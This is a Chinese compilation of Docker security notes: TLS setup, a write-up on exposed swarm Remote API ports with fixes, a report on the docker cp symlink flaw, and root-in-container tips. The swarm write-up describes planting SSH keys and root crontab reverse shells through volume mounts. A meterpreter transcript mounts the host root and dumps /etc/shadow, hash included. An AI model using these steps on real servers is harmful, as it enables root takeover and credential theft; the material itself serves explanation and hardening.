#Docker tls verify
在你说 Docker 不安全之前，先检讨一下自己是不是做错了。
检查一下 dockerd 引擎是否配置错误：ps -ef | grep dockerd，如果你看到的是这样子的：
$ ps -ef | grep dockerd
123  root   12:34   /usr/bin/dockerd -H unix:///var/run/docker.sock -H tcp://0.0.0.0:2375
 
如果在其中没有 --tlsverify 类的 TLS 配置参数，那就说明你将你的系统大门彻底敞开了。这是配置上严重的安全事故。
-H tcp://0.0.0.0:2375 是说你希望通过 2375/tcp 来操控你的 Docker 引擎，但是如果你没有加 --tlsverify 类的配置，就表明你的意图是允许任何人来操控你的 Docker 引擎，而 Docker 引擎是以 root 权限允许的，
因此，你等于给了地球上所有人你服务器的 root 权限，而且还没密码。
这也是为什么推荐使用 docker-machine 进行 Docker 宿主管理的原因，因为 docker-machine 会帮你创建证书、配置 TLS，确保服务器的安全。


>https://docs.docker.com/engine/security/https/





#swarm
0x00 概述
最近提交了一些关于 docker remote api 未授权访问导致代码泄露、获取服务器root权限的漏洞，造成的影响都比较严重，比如

新姿势之获取果壳全站代码和多台机器root权限

新姿势之控制蜻蜓fm所有服务器

新姿势之获取百度机器root权限 【已公开】

因为之前关注这一块的人并不多，这个方法可以算是一个“新的姿势”，本文对漏洞产生的原因和利用过程进行简单的分析和说明，但因为时间和精力有限，可能会有错误，欢迎大家指出～

0x01 起因
先介绍一些东西～

docker swarmdocker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。
漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，然后他研究了下，发现这是 Docker Remote API，可以执行docker命令，比如访问 http://host:2375/containers/json 会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。

然后我想了想 swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。

尼玛这一想，问题来了：

他是按照官方文档弄的，难不成文档里写的有问题？
他这么干，会不会有其他人也这么干，然后端口就直接暴露在公网了，那岂不是谁可以随便操作了docker了？
因为这位同学刚好有其他事情要忙，没时间撸，我之前也用过docker，所以我就继续研究了，然后就走上了挖掘新姿势的不归路…

0x02 背锅侠
要查清楚是谁的锅，首先要复现下问题，那么只有一种方法，照的文档装一遍docker swarm。

官网给出创建Docker Swarm集群的方法有：

使用docker run 运行 swarm container（官方推荐，文档中都是使用该方法）
安装 swarm 二进制文件（executable swarm binary）
这里使用官方推荐方法，系统使用ubuntu14.04，按照 Build a Swarm cluster for production 这篇文档装了一遍。

这里简单描述下过程：

需要在每台机器上安装docker，并且运行Docker Swarm container
需要一个或多个Swarm manager（主从）来管理docker 节点
管理的docker节点上需要开放一个TCP端口（2375）来与Swarm manager通信
这里的第三点就是前面提到的暴露的docker端口，我们来看一下文档中docker 节点具体执行的命令

sudo docker daemon -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock

-H参数指定docker daemon绑定在了 tcp://0.0.0.0:2375 上。

docker默认安装的时候只会监听在 unix:///var/run/docker.sock，因此这里是端口暴露的原因所在。

那么能不能说这个是 docker swarm 的锅呢？

我们来看一下文档中的安装环境

Prerequisites An Amazon Web Services (AWS) account Familiarity with AWS features and tools, such as: Elastic Cloud (EC2) Dashboard Virtual Private Cloud (VPC) Dashboard VPC Security groups Connecting to an EC2 instance using SSH

是在AWS VPC上，默认的访问策略是

AWS uses a “security group” to allow specific types of network traffic on your VPC network. The default security group’s initial set of rules deny all inbound traffic, allow all outbound traffic, and allow all traffic between instances.

即禁止所有的外网端口访问，文档中之后的部分修改了策略允许22和80端口访问，也就说在文档的环境中，不会存在2375端口暴露的问题，且文档中也提到了不要让docker 的端口暴露在外，虽然没有加字体加粗高亮～

For a production environment, you would apply more restrictive security measures. Do not leave Docker Engine ports unprotected.

然而即使高亮了也没有软用，首先是使用者并不一定有类似AWS的VPC环境，再者不是每个使用者都会认真的看文档，所以最终的结论是，这锅docker官方和使用者都得背，谁背的多就不好说了～

0x03 漏洞利用
说如何利用之前，我们先整理下现在能做的事情

​执行docker命令，比如操作container、image等

那么如果当前运行的container，或者image内有代码或者其他敏感信息，就可以继续深入了，比如果壳和蜻蜓fm的漏洞，就是深入后的结果。

还有的话，可以做内网代理，进一步渗透。

到目前为止，我们能做的事情都是在docker的环境内，无法直接控制宿主机。

那么怎么才能控制宿主机呢？莫慌，分析下

docker是以root权限运行的，但docker执行命令只能在container内部，与宿主机是隔离的，即使是反弹一个shell，控制的也是container，除非有0day，不然是无法逃逸的到宿主机的～

那么只能从docker命令本身下手，脑洞开了下，想到docker 运行 container的时候，可以将本地文件或目录作为volume挂载到container内，并且在container内部，这些文件和目录是可以修改的。

root权限进程，并且能够写文件，是不是似曾相识？

这里的场景和前段时间的 redis + ssh 漏洞很相似，那么这里需要看一下服务器是否有ssh服务，如果有的话，那么直接把/root/.ssh目录挂载到container内，比如/tmp /.ssh，然后修改/tmp/.ssh/authorized_keys 文件，把自己的public key写进去，修改权限为600，然后就可以以root用户登录了。

注：有些服务器会配置不允许root用户直接登录，可以通过挂载 /etc/ssh/sshd_config 查看配置。这个时候，你换一个用户目录写入就行，并且挂载修改 /etc/sudoers 文件，直接配置成免密码，sudo切换root即可。

如果没有运行ssh服务，那么也可以利用挂载写crontab定时任务，比如ubuntu root用户的crontab文件在 /var/spool/cron/crontabs/root，反弹一个shell～

这里利用方式可能还有很多种，大家可以开下脑洞想哈～

0x04 影响
影响总结：攻击者可以利用该漏洞执行docker命令，获取敏感信息，并获取服务器root权限

目前在公网上暴露的2375端口还有不少，测了一些基本都可以利用。

但docker swarm更多的情况是用在企业内部，虽然在内网，也不意味着绝对安全，当边界被突破，就嘿嘿嘿了～

0x05 修复方案
注：因为本小节内容是看了文档后的个人理解，并且部分内容未进行实际验证，可能会错误，仅供参考！

如果你的2375端口是暴露在公网的，那么最简单的方式就是禁止外网访问或者设置白名单，因为根据官网介绍，swarm本来就不应该在公网中使用。

以上方法仅仅防止了外网访问，但如果本身已经在内网，对于已经撸进内网的攻击者，端口仍然处于可以直接访问的状态，那么有没一些防护方案呢？

为了找到答案，特意看了下docker swarm的文档，Plan for Swarm in production 这篇文章提到了两种方案

第一种方法是使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行，官网图如下： 
​然而在我对公网中使用TLS的docker remote api（使用2376端口）测试中发现，即使没有证书，Docker CLI仍然可以正常访问，这里我也拿docker python api写了脚本，设置不验证证书有效性，也同样可以访问。

因为这我没有具体配置过TLS，只能根据以上测试结果推测，走TLS认证，只能防止MITM 攻击，还是无法解决端口未授权访问的问题。

第二种方法是网络访问控制(Network access control)：文档中列出了 Swarm manager，Swarm nodes 等用到的端口，告诉你要配置合理的访问规则。文档中还提到了这么一段话
For added security you can configure the ephemeral port rules to only allow connections from interfaces on known Swarm devices.

大概意思是只允许信任的swarm devices之间通信。

理想情况就是docker 节点的2375端口只允许swarm manager来访问，但因为swarm manager可能会有多个，就需要配置多条规则，维护起来可能会具有一定复杂度，但只要swarm manager所在机器不被撸，就可以保证docker 节点的2375端口不被未授权访问。当然，这里还需要结合TLS一起使用。

总结来说就是，不要将端口直接暴露在公网，内网中使用需要设置严格的访问规则，并使用TLS。

0x06 瞎扯
如果你仔细阅读了docker swarm的文档，你就会发现除了2375端口，还有其他一些端口也存在相同的问题，这里就不一一的列出了。

本文主要说的是docker swarm，但是只要是会导致端口暴露的，都会存在问题，也许有一些使用者会因为某些原因，把端口配置成功公网访问，或者有另一个”swarm”呢？

还有想说的是，一个新的东西出来，用户和开发者更多关注的是其功能和便利性，而忽略了存在的安全性问题，之后还会有更多的 “docker remote api” 出现，谁将会是下一个呢？


>http://www.hacksec.cn/Privilege-upgrade/294.html



#privilege

我们将通过滥用容器内可用的docker socket来提权。由于docker在宿主机上是以root身份运行的，因此它也具有root权限。我们可以滥用它来执行多项操作。例如，使用–privileged选项可以为我们提供许多扩展功能，以下是从docker官方文档中提取的解释文本：

默认情况下，Docker的容器是没有特权的，例如不能在容器中再启动一个容器。这是因为默认情况下容器是不能访问任何其它设备的。但是通过”privileged”，容器就拥有了访问任何其它设备的权限。当操作者执行docker run –privileged时，Docker将拥有访问主机所有设备的权限，同时Docker也会在apparmor或者selinux做一些设置，使容器可以容易的访问那些运行在容器外部的设备。

你可以使用–device选项访问设备。但在本示例中，我将映射toor文件系统 (/) 到容器中并访问它。

由于此容器中没有docker客户端，因此下一步我们要做的就是在目标容器中设置docker客户端及其依赖项。你只需运行以下命令，即可完成所有这些操作。
```
upload /docker /docker upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7 chmod 777 /docker chmod +x /docker
meterpreter > upload /docker /docker [*] uploading : /docker -> /docker [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker [*] Uploaded -1.00 B of 36.36 MiB (0.0%): /docker -> /docker [*] uploaded : /docker -> /docker meterpreter > upload /usr/lib/x86_64-linux-gnu/libltdl.so.7 /usr/lib/x86_64-linux-gnu/libltdl.so.7 [*] uploading : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7 [*] Uploaded -1.00 B of 38.47 KiB (-0.0%): /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7 [*] uploaded : /usr/lib/x86_64-linux-gnu/libltdl.so.7 -> /usr/lib/x86_64-linux-gnu/libltdl.so.7 meterpreter > chmod 777 /docker meterpreter > chmod +x /docker meterpreter >
```
现在，我们就可以使用docker来访问宿主机上的文件系统了。
```
execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow"
```
我们来转储下本地用户的哈希，输出结果如下：
```
meterpreter > execute -f /docker -i -H -c -a "run --rm -v '/:/rootfs' debian:9.2 cat /rootfs/etc/shadow" Process 113 created. Channel 13 created. root:$1$UFKdtFGw$qp29y1qGWit/vnvIG0uSr1:17488:0:99999:7::: daemon:*:17488:0:99999:7::: bin:*:17488:0:99999:7::: sys:*:17488:0:99999:7::: sync:*:17488:0:99999:7::: games:*:17488:0:99999:7::: man:*:17488:0:99999:7::: lp:*:17488:0:99999:7::: mail:*:17488:0:99999:7::: news:*:17488:0:99999:7:::
```




privileged 使用该参数，container 内的 root 拥有真正的 root 权限。
否则，container 内的 root 只是外部的一个普通用户权限。
privileged 启动的容器，可以看到很多 host 上的设备，并且可以执行 mount。
甚至允许你在 docker 容器中启动 docker 容器。

所以如果没有使用 privileged 参数，应该是安全的沙盒模式。


> 能进到宿主环境吗
进到这个词太抽象了，是指的隔离性吗？
docker 的隔离性一般情况是足够的，但还是有办法读取到宿主环境的一些信息。(不管你开不开 privileged)
最常见的场景 cgroup 隔离性不足
就是 cgroup namespace 的支持需要打内核补丁，所以你在 docker 环境里可以读取宿主机上的进程信息。
所以对此有了很多解决方案。阿里推的 https://github.com/alibaba/pouch 主打特性就是 Strong isolation, 对比 docker 就是隔离性较弱了。

如果是黑客，一般到机器上扔个 fork 炸弹，弱一点的平台就挂了=。= 一试一个准

>http://www.52bug.cn/hkjs/5523.html




#毫不夸张的说，所有的 Docker 版本都存在同一个漏洞，这个漏洞可以让攻击者获得主机服务器上所有路径的读写访问权限。据了解，之所以会出现该漏洞，主要是因为 Docker 软件处理某些符号链接的方式，而这些符号链接中往往会包含有到其他目录或文件的路径的文件。

事件回溯
研究员 Aleksa Sarai 发现，在某些情况下，攻击者可以在路径解析时间和操作时间之间的短时间窗口将自己的符号链接插入到路径中。这是 TOCTOU 问题的一个变体，特别是“docker cp”命令，它可以将文件从主机复制到容器，或从容器复制到主机。

Sarai 表示，“这次攻击的基本前提是 FollowSymlinkInScope 遭受了相当根本的 TOCTOU 攻击。FollowSymlinkInScope 的目的是获取给定路径并安全解析，就好像进程位于容器内部一样。完整路径被解析之后，路径会被传递，同时会进行一些操作（例如，在’docker cp’的情况下，它会在创建流式传输到客户端的存档时打开）。”

“如果攻击者在解析之后、操作之前，向路径添加符号链接组件，那么主机上的符号链接路径组件就会被解析为 root。如果正好是在‘docker cp’的情况下，攻击者就可以对主机上的所有路径进行读写访问。”

研究人员认为针对 Docker 的这种攻击可能会持续几年时间。Sarai 针对这一漏洞开发了利用代码，并表示：潜在的攻击场景可能来自云平台，“最可能受到影响的是托管云，因为它允许配置文件复制到正在运行的容器中，也允许从容器中读取文件。”

虽然这个漏洞只有针对“docker cp”的攻击代码，但它是最容易被攻击的端点。另外还有一个值得注意的点，如果选择了一条路径，扩展了其中的所有符号链接，并假设该路径是安全的，那么这是一种非常危险的行为。

如何修复
“这个 Docker 漏洞虽然看起来很严重，但对大多数企业来说未必是紧急情况。” Capsule8 产品开发副总裁 Kelly Shortridge 表示：“Docker 的这个 TOCTOU 漏洞允许攻击者不仅在容器内，而且在主机上违反数据完整性和机密性。除了禁止在任何正在运行的容器上使用 docker cp 实用程序或使用攻击保护产品之外，利用 docker cp 的 Docker 用户很容易受到攻击，但仅限于动机足够强的攻击者，他们有意愿与 docker cp 竞争。”

据了解，Sarai 已经提交了针对该漏洞的修复建议，其中包括在使用文件系统时暂停容器。

这个问题最完整的解决方案是修改 chrootarchive，这样所有的存档操作都将以根目录作为容器 rootfs 进行 (而不是父目录，因为父目录是由攻击者控制的，所以导致了这个漏洞)。不过，要对 Docker 核心部分做更改几乎是不可能完成的事情。

退而求其次，我们选择了在使用文件系统时暂停容器。这种方法能够阻止最基本的攻击，但是在某些攻击场景下无法发挥作用，例如 shared volume mounts。

不过，截止到目前还没有关于 Docker 官方何时修复漏洞的消息。

网友支招
Docker 的这个漏洞公布之后，引发了网友的广泛讨论，大家各抒己见，纷纷为解决该漏洞献计献策。

有网友建议：“至少在某些情况下，符号链接攻击是可以通过验证路径的布尔函数来避免的。如果路径不受符号链接攻击，返回 true，否则返回 false。不受符号链接攻击意味着遍历路径，检查每个目录的权限，确保其不允许任何人创建符号链接。如果路径是相对的，则将当前工作目录作为前缀，以便进行检查。如果路径包含符号链接，那么我们必须验证符号链接目标的实际父目录，且不允许替换该目标。其实，我们只要把路径规范化就可以了，但是这种做法是不可取的，因为软件必须保证已给出的路径不变，而符号链接抽象是属于用户的，应该被尊重。”

也有网友建议：“在 syscall 系列中使用 open + O_PATH + *，它可以用来获得一个已解析目录的句柄，用户可以操作该目录而不会对该句柄上的不同操作进行重新遍历。或者也可以临时加入容器的 mount 命名空间以获取源句柄，不过这种方法很难真正实现，因为 goroutines 无法很好地处理每个线程的操作。”

对于 Docker 的这个漏洞，您有何解决方法？欢迎在下方留言讨论！

参考链接： https://duo.com/decipher/docker-bug-allows-root-access-to-host-file-system

https://news.ycombinator.com/item?id=20031403













#docker sudo

>https://stackoverflow.com/questions/25845538/how-to-use-sudo-inside-a-docker-container

For anyone who has this issue with an already running container, and they don't necessarily want to rebuild, the following command connects to a running container with root privileges:

```
docker exec -ti -u root container_name bash
```

You can also connect using its ID, rather than its name, by finding it with:

```
docker ps -l
```

To save your changes so that they are still there when you next launch the container (or docker-compose cluster) - note that these changes would not be repeated if you rebuild from scratch:

```
docker commit container_id image_name
```

To roll back to a previous image version (warning: this deletes history rather than appends to the end, so to keep a reference to the current image, tag it first using the optional step):

```
docker history image_name
docker tag latest_image_id my_descriptive_tag_name  # optional
docker tag desired_history_image_id image_name
```

To start a container that isn't running and connect as root:

```
docker run -ti -u root --entrypoint=/bin/bash image_id_or_name -s
```

To copy from a running container:

```
docker cp <containerId>:/file/path/within/container /host/path/target
```

To export a copy of the image:

```
docker save container | gzip > /dir/file.tar.gz
```

Which you can restore to another Docker install using:

```
gzcat /dir/file.tar.gz | docker load
```

It is much quicker but takes more space to not compress, using:

```
docker save container | dir/file.tar
```

And:

```
cat dir/file.tar | docker load
```